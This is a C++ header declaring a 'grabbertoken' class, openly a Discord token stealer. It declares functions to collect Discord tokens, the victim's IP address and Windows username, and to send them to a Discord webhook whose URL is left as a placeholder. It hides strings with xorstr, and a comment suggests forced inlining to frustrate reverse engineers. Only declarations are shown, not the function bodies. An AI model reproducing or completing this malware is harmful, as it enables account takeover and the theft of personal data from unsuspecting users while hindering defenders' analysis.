#pragma once
#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <regex>
#include <fstream>
#include <chrono>
#include <thread>
#include <wininet.h>
#include <Lmcons.h>
#pragma warning(disable : 4996).
#pragma comment(lib, "wininet.lib")

#include "xorstr.h"

class grabbertoken // deplantis#6315
{
public:
   
    // recommend to _forceline the functions to make it more difficult for Reverse Engineers
   
    // grab everything
    void grab()
    {
        grabpcusername();
        grabip();
        grabtoken();
    }

    // discord token grabber
	void grabtoken();
    void findtoken(std::string path); 

    // grab ipaddres
    std::string real_ip();
    void grabip();

    // grab pc username
    void grabpcusername();

private:
   const std::string webhookname = "tudou"; // the webhook name
   const std::string webhook_url = xorstr_(" ( you webhook url) "); // webhook url
   const std::string avatar_url = xorstr_("https://i.pinimg.com/236x/99/c8/8f/99c88f80f5080c31ddbb817e7ab3c8c3.jpg"); // tudou
   std::vector<std::string> discordtokens; // this is where all tokens gonna get stored

};
